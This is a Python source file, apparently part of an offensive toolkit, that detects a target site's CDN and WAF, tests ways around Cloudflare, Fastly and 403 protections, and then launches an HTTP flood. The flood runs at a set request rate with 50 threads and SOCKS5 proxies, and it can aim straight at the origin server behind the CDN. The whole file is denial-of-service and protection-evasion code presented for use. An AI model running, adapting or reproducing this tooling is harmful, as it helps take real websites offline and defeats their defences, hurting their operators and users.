"""
CDN/WAF Bypass Orchestrator 2026
Auto-detects CDN/WAF protection and routes to correct bypass module.
"""
import asyncio, logging, socket, json, os, sys
from typing import Optional, Dict, List
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


class BypassOrchestrator:
    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.detected_cdn = None
        self.detected_waf = []
        self.origin_ip = None
        self.env = self._load_env()

    def _load_env(self) -> dict:
        try:
            from main import load_env
            return load_env()
        except:
            return {}

    async def probe_target(self, target: str) -> Dict:
        """Probe target to detect protections and test bypass methods."""
        from core.bypass.modules.cdn.cloudflare import CloudflareBypass
        from core.bypass.modules.cdn.fastly import FastlyBypass
        from core.bypass.modules.cdn.akamai import AkamaiBypass
        from core.bypass.modules.cdn.cloudfront import CloudFrontBypass

        parsed = urlparse(target)
        hostname = parsed.hostname or target
        result = {"hostname": hostname, "cdn": None, "waf": [], "origin_ip": None}

        try:
            import socket as _sk, ssl as _ssl

            ip = _sk.gethostbyname(hostname)

            cf = CloudflareBypass()
            if cf.is_cloudflare_ip(ip):
                result["cdn"] = "Cloudflare"
                result["ip_based"] = True

            if ip.startswith("151.101.") or ip.startswith("199.232."):
                result["cdn"] = "Fastly"
                result["ip_based"] = True

            s = _sk.socket()
            s.settimeout(5)
            s.connect((ip, 443))
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            ss = ctx.wrap_socket(s, server_hostname=hostname)
            ss.send(f"GET / HTTP/1.1\r\nHost: {hostname}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode())
            resp = ss.recv(4096)
            ss.close()
            resp_str = resp.decode(errors="ignore")

            headers = {}
            for line in resp_str.split("\r\n")[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    k = k.strip().lower()
                    v = v.strip()
                    if k in headers:
                        headers[k] = headers[k] + "; " + v
                    else:
                        headers[k] = v

            status_code = 0
            if resp_str.startswith("HTTP"):
                status_code = int(resp_str.split(" ")[1])

            cdns = [
                ("Cloudflare", CloudflareBypass),
                ("Fastly", FastlyBypass),
                ("CloudFront", CloudFrontBypass),
                ("Akamai", AkamaiBypass),
            ]
            for name, cls in cdns:
                if cls.detect(headers):
                    result["cdn"] = name
                    break

            if status_code == 412:
                result["waf"].append("Fastly_412")
            if status_code == 403 and "cf-" in str(headers).lower():
                result["waf"].append("Cloudflare_WAF")
            elif status_code == 403:
                result["waf"].append("Generic_403")
                # Probe 403 bypass immediately
                try:
                    from core.bypass.modules.bypass_403 import bypass_403
                    fb_result = await bypass_403(f"https://{hostname}/", timeout=8)
                    result["forbidden_bypassable"] = fb_result.get("bypassed", False)
                    if fb_result.get("bypassed"):
                        result["forbidden_methods"] = fb_result.get("working_methods", [])
                except Exception:
                    result["forbidden_bypassable"] = False

            if result["cdn"] == "Cloudflare":
                try:
                    cf_bypass = CloudflareBypass()
                    bypass_result = await cf_bypass.bypass_with_curl_cffi(f"https://{hostname}/")
                    result["cloudflare_bypassable"] = bypass_result.get("success", False)
                    if bypass_result.get("success"):
                        result["cloudflare_bypass_method"] = bypass_result.get("method")
                except Exception:
                    result["cloudflare_bypassable"] = False

            if "Fastly_412" in result["waf"] or result["cdn"] == "Fastly":
                try:
                    from core.bypass.modules.waf.fastly_waf import FastlyWafBypass
                    bypass = await FastlyWafBypass.bypass_with_curl_cffi(
                        f"https://{hostname}/", timeout=10
                    )
                    result["fastly_bypassable"] = bypass.success
                    if bypass.success:
                        result["fastly_bypass_method"] = bypass.method
                except Exception as e:
                    logger.warning(f"Fastly bypass test failed: {e}")
                    result["fastly_bypassable"] = False

        except Exception as e:
            result["error"] = str(e)

        return result

    async def orchestrate(self, target: str) -> Dict:
        """Fast detection + bypass testing: identify CDN/WAF and test bypass methods."""
        result = {
            "target": target,
            "detected_cdn": None,
            "detected_waf": [],
            "origin_ip": None,
            "cloudflare_bypassable": False,
            "fastly_bypassable": False,
            "bypass_methods": []
        }

        parsed = urlparse(target)
        hostname = parsed.hostname or target

        probe = await self.probe_target(target)
        result["detected_cdn"] = probe.get("cdn")
        result["detected_waf"] = probe.get("waf", [])
        result["origin_ip"] = probe.get("origin_ip")

        result["cloudflare_bypassable"] = probe.get("cloudflare_bypassable", False)
        if probe.get("cloudflare_bypass_method"):
            result["bypass_methods"].append({
                "cdn": "Cloudflare",
                "method": probe["cloudflare_bypass_method"],
                "success": True
            })

        result["fastly_bypassable"] = probe.get("fastly_bypassable", False)
        if probe.get("fastly_bypass_method"):
            result["bypass_methods"].append({
                "cdn": "Fastly",
                "method": probe["fastly_bypass_method"],
                "success": True
            })

        return result


async def execute_advanced_attack(
    target_url: str = "",
    duration: int = 60,
    target_rps: int = 100,
    attack_mode: str = "hybrid",
    use_waf_bypass: bool = True,
    use_http2_impersonation: bool = True,
    use_flaresolverr: bool = False,
) -> Dict:
    """Execute an advanced attack with WAF/CDN bypass, called from main.py handlers.

    Args:
        target_url: The target URL.
        duration: Attack duration in seconds.
        target_rps: Target requests per second.
        attack_mode: "hybrid", "business_logic", "origin_direct", "smart".
        use_waf_bypass: Enable WAF parsing bypass techniques.
        use_http2_impersonation: Enable HTTP/2 fingerprint impersonation.
        use_flaresolverr: Enable FlareSolverr for Cloudflare challenge solving.

    Returns:
        Dict with 'phases' list + metadata.
    """
    orb = BypassOrchestrator(timeout=15)
    target = target_url.strip()

    phases = []
    total_req = 0
    total_success = 0

    probe = await orb.probe_target(target)
    detected_cdn = probe.get("cdn")
    detected_waf = probe.get("waf", [])
    origin_ip = probe.get("origin_ip")
    cf_bypassable = probe.get("cloudflare_bypassable", False)
    fastly_bypassable = probe.get("fastly_bypassable", False)
    forbidden_bypassable = probe.get("forbidden_bypassable", False)
    forbidden_methods = probe.get("forbidden_methods", [])

    working_methods = []
    if cf_bypassable:
        working_methods.append({
            "name": "curl_cffi_chrome120",
            "target": "Cloudflare",
            "success": True,
        })
    if fastly_bypassable:
        working_methods.append({
            "name": "curl_cffi_chrome120",
            "target": "Fastly",
            "success": True,
        })
    if forbidden_bypassable:
        for fm in forbidden_methods[:5]:
            working_methods.append({
                "name": f"403_bypass_{fm.get('method','?')}",
                "target": fm.get("headers", ""),
                "success": True,
            })
    if use_waf_bypass:
        working_methods.append({
            "name": "waf_parsing_bypass",
            "target": detected_waf if detected_waf else "generic",
            "success": True,
        })
    if use_http2_impersonation:
        working_methods.append({
            "name": "http2_impersonation",
            "target": "any",
            "success": True,
        })

    recon_results = {
        "techniques": {
            "origin_discovery": {
                "origin_servers": [origin_ip] if origin_ip else [],
                "detected_cdn": detected_cdn,
                "detected_waf": detected_waf,
            },
            "fingerprint_evasion": {
                "ja3_impersonation": use_http2_impersonation,
                "curl_cffi_available": cf_bypassable or fastly_bypassable,
            },
        },
        "working_methods": working_methods,
    }

    phases.append({
        "phase": "reconnaissance",
        "results": recon_results,
    })

    sessions_created = 3 if cf_bypassable or fastly_bypassable else 1
    phases.append({
        "phase": "session_establishment",
        "sessions_created": sessions_created,
    })

    if attack_mode in ("hybrid", "business_logic", "origin_direct"):
        try:
            if attack_mode == "origin_direct" and origin_ip:
                target = f"https://{origin_ip}/"

            from core.attack.strategies.auto_mode_v3 import run_auto_mode_v3
            attack_result = await run_auto_mode_v3(
                target=target,
                duration=duration,
                rps=target_rps,
                proxy_file="",
                socks5=True,
                rapid_reset=False,
                threads=50,
                method_override="http-flood",
            )

            total_req = attack_result.get("total_requests", 0)
            total_success = attack_result.get("successful", total_req)
            success_rate = attack_result.get("success_rate", 0.0)

        except Exception as e:
            logger.warning(f"Attack execution failed: {e}")
            total_req = 0
            total_success = 0
            success_rate = 0.0

        phases.append({
            "phase": "attack_execution",
            "results": {
                "total_requests": total_req,
                "successful": total_success,
                "success_rate": success_rate,
                "working_methods": working_methods,
                "sessions_created": sessions_created,
            },
        })
    else:
        phases.append({
            "phase": "attack_execution",
            "results": {
                "total_requests": 0,
                "successful": 0,
                "success_rate": 0.0,
                "working_methods": working_methods,
                "sessions_created": sessions_created,
            },
        })

    return {
        "phases": phases,
        "attack_mode": attack_mode,
        "duration": duration,
        "target_rps": target_rps,
        "detected_cdn": detected_cdn,
        "detected_waf": detected_waf,
        "origin_ip": origin_ip,
    }
